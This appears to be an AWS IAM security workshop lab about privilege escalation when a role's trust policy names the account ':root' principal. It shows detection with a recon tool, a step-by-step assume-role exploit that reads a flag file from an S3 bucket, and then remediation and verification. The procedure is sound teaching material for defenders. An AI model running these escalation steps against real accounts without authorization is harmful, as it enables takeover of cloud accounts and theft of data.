## Scenario 2: Trust Policy `:root` — Privilege Escalation via Permissive Role Trust

**Category:** Principal Access
**Starting Identity:** `iamws-role-assumer-user`
**Target:** Crown jewels via assuming `iamws-privileged-admin-role`

**The Vulnerability:** `iamws-privileged-admin-role` has a trust policy that specifies `arn:aws:iam::ACCOUNT_ID:root` as the trusted principal. Despite looking like it restricts access to the root user, `:root` in a trust policy means any principal in the account with `sts:AssumeRole` permission can assume this role.

**Real-world scenario:** The `Principal: { "AWS": "arn:aws:iam::ACCOUNT_ID:root" }` pattern is the AWS-recommended idiom for *cross-account* role delegation — the trusting account names the partner account's root, and the partner account's IAM admin gates which of their principals can actually call `sts:AssumeRole`. An engineer building same-account automation copies this snippet from AWS docs or an internal Terraform module and substitutes their own account ID. The trust policy now looks identical to the canonical cross-account example, but the second-layer gate is gone: inside a single account there is no separate IAM admin restricting who can assume. Every IAM user and role in the account with `sts:AssumeRole` permission can now become an administrator, and a single compromised low-privilege identity expands into full account takeover.

### Part A: Identify with iam-recon

Run the privilege escalation preset to surface suspicious STS edges:

```bash
iam-recon --account $ACCOUNT_ID argquery --preset privesc
```

Expected output (relevant excerpt):
```
──────────────────────────────
  Privilege Escalation Paths
──────────────────────────────

  >>> user/iamws-role-assumer-user can escalate to admin:
    user/iamws-role-assumer-user -> STS role/iamws-privileged-admin-role
```

The `STS` edge flags that `iamws-role-assumer-user` can reach the admin-tier `iamws-privileged-admin-role` via `sts:AssumeRole`.

Confirm the specific action directly:

```bash
iam-recon --account $ACCOUNT_ID argquery \
  --principal user/iamws-role-assumer-user \
  --action sts:AssumeRole \
  --resource 'arn:aws:iam::*:role/iamws-privileged-admin-role'
```

Expected output:
```
ALLOW user/iamws-role-assumer-user can call sts:AssumeRole with arn:aws:iam::*:role/iamws-privileged-admin-role
```

Cross-reference with pathfinding.cloud's known path database. Use `--principal` to filter to just this identity instead of scrolling through every match in the graph:

```bash
iam-recon --account $ACCOUNT_ID pathfinding \
  --principal user/iamws-role-assumer-user
```

Expected output:
```
Pathfinding.cloud
  Database: N known escalation paths bundled

  user/iamws-role-assumer-user — 1 paths matched:

  [sts-001] sts:AssumeRole (principal-access)
    Permissions: sts:AssumeRole
    https://www.pathfinding.cloud/paths/sts-001
```

**In the interactive visualization:** Search for `role-assumer-user`. You'll see an orange node with an **STS** edge leading to the red admin role. Click the red admin role and click the box labeled `role/iamws-privileged-admin-role-trust` — `iam-recon` displays the trust policy inline, showing `:root` as the trusted principal.

### Part B: Understand the Attack

Visit [pathfinding.cloud/paths/sts-001](https://pathfinding.cloud/paths/sts-001):

- **Category:** Principal Access
- **Required permission:** `sts:AssumeRole` on the caller's identity policy **plus** a permissive trust policy on the target role
- **Root cause:** Trust policy specifies `:root` instead of specific principals
- **Impact:** Any principal in the account can assume an admin-tier role

> [!NOTE]
> This attack requires two things: 
> 1. The starting user/role must have permission to do the `sts:AssumeRole` action and 
>2. The **target role's trust policy** must allow the starting user/role to assume the role. Remember that trust policies are resource policies attached to the role itself. They control who can assume the role, independent of what the caller's identity policy allows.

### Part C: Exploit the Vulnerability

**Step 1: Confirm your low-privilege identity**

```bash
aws sts get-caller-identity --profile iamws-role-assumer-user
```

Expected output:
```json
{
    "UserId": "AIDAXXXXXXXXXXXXXXXXX",
    "Account": "767397689800",
    "Arn": "arn:aws:iam::767397689800:user/iamws-role-assumer-user"
}
```

You're operating as the `iamws-role-assumer-user` IAM user.

**Step 2: Try the crown jewels directly — you're denied**

```bash
aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
  --profile iamws-role-assumer-user
```

Expected output:
```
fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
```

The `iamws-role-assumer-user` can't reach the crown jewels directly, but you learned from `iam-recon` that `iamws-role-assumer-user` has a path to `iamws-privileged-admin-role` via `sts:AssumeRole`. You will exploit this path to get access to the crown jewels.

**Step 3 (Optional): Inspect the vulnerable trust policy via the AWS CLI**

You can use the AWS CLI to inspect the target role trust policy just as you did in `iam-recon`. The `:root` principal is the smoking gun — this role trusts the entire account.


```bash
aws iam get-role --role-name iamws-privileged-admin-role \
  --query 'Role.AssumeRolePolicyDocument' --output json \
  --profile iamws-role-assumer-user
```

Expected output:
```json
{
    "Version": "2012-10-17",
    "Statement": [{
        "Effect": "Allow",
        "Principal": { "AWS": "arn:aws:iam::767397689800:root" },
        "Action": "sts:AssumeRole"
    }]
}
```

**Step 4: Assume the privileged admin role**

Run the following command to use `sts:AssumeRole` to return credentials for a session with `iamws-privileged-admin-role`.

```bash
ADMIN_CREDS=$(aws sts assume-role \
  --role-arn arn:aws:iam::${ACCOUNT_ID}:role/iamws-privileged-admin-role \
  --role-session-name escalated \
  --query "Credentials" --output json \
  --profile iamws-role-assumer-user)
```

You can echo $ADMIN_CREDS to understand what `sts:AssumeRole` returned.

```
echo $ADMIN_CREDS
```

Configure local environment variables with the temporary credentials, this will authenticate the AWS CLI as the `iamws-privileged-admin-role` for future commands.

```
export AWS_ACCESS_KEY_ID=$(echo $ADMIN_CREDS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $ADMIN_CREDS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $ADMIN_CREDS | jq -r '.SessionToken')
```

**Step 5: Claim the crown jewels with elevated credentials**

Confirm you are now running AWS commands as the `iamws-privileged-admin-role`

```bash
aws sts get-caller-identity
```

Expected output:
```json
{
    "UserId": "AROAXXXXXXXXXXXXXXXXX:escalated",
    "Account": "767397689800",
    "Arn": "arn:aws:sts::767397689800:assumed-role/iamws-privileged-admin-role/escalated"
}
```

> [!NOTE]
> `escalated` is the role session name. You named the session earlier in step 4 when you ran the `assume-role` command with the `--role-session-name` argument.

Try to access the crowned jewels again.

```bash
aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt -
```

The file contents appear — you escalated to a role with `AdministratorAccess` and can access the sensitive files!

### Part D: Apply the Defense

**Step 1: Clean up the escalated session**

```bash
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN  
```

Confirm you're back to iamws-role-assumer-user.

```
aws sts get-caller-identity 
```

Run all defense steps as your admin identity (not as `iamws-role-assumer-user`).

**Step 2: Harden — replace `:root` with a specific principal**

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
ADMIN_ROLE_ARN=$(aws sts get-caller-identity --query Arn --output text)

aws iam update-assume-role-policy \
  --role-name iamws-privileged-admin-role \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Principal": {"AWS": "'$ADMIN_ROLE_ARN'"},
      "Action": "sts:AssumeRole"
    }]
  }'
```

What this changes:
1. **Specific principal:** Only your admin identity can assume the role — eliminates the `:root` vulnerability.

### Part E: Verify the Remediation

**Step 1: Re-run the exploit as the attacker — confirm it's blocked**

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::${ACCOUNT_ID}:role/iamws-privileged-admin-role \
  --role-session-name escalated \
  --profile iamws-role-assumer-user
```

Expected output:
```
An error occurred (AccessDenied) when calling the AssumeRole operation:
User: arn:aws:iam::767397689800:user/iamws-role-assumer-user
is not authorized to perform: sts:AssumeRole on resource:
arn:aws:iam::767397689800:role/iamws-privileged-admin-role
```

The attack is blocked.

**Step 2: Confirm the crown jewels are still safe**

```bash
aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
  --profile iamws-role-assumer-user
```

Expected output:
```
fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
```

**Step 3: Verify with iam-recon**

Refresh the `iam-recon` graph.

```bash
iam-recon graph create --profile iamws-lab-default
```

Re-run the privesc preset.

```bash
iam-recon --account $ACCOUNT_ID argquery --preset privesc
```

The `user/iamws-role-assumer-user -> STS role/iamws-privileged-admin-role` line is gone. The graph drops from 20 edges to 18. `argquery --preset privesc` is the correct verification surface here — its STS edge checker evaluates trust policies.

> [!NOTE]
> Running `argquery --principal user/iamws-role-assumer-user --action sts:AssumeRole --resource <role-arn>` will still return `ALLOW` after the defense. iam-recon's per-action query only checks the caller's identity policy, not the role's trust policy. AWS `simulate-principal-policy` has the same limitation by design. The live `aws sts assume-role` attempt and the disappearance of the STS edge in `argquery --preset privesc` are the two authoritative verifications.

**In the interactive visualization:** search for `privileged-admin-role`. The STS edge between `iamws-role-assumer-user` and `iamws-privileged-admin-role` is gone. Click the role node — the inspect panel shows `iamws-privileged-admin-role-trust` under **TRUST** (clickable). Note: iam-recon's viz flags this trust policy as "1 RISK" even after hardening — this is cosmetic; the absent STS edge is the authoritative signal.

### What You Learned

- How to escalate privileges from a lesser priviledged IAM user to a priviledged Admin role
- Trust policies that specify `:root` trust every principal in the account — not just the AWS root user.
- For `sts:AssumeRole` to work, the starting identity must have `sts:AssumeRole` permissions and the target role must have a trust policy that includes the starting identity as a principal
- Any principal that can assume an IAM role can use the full set of permissions attached to that role.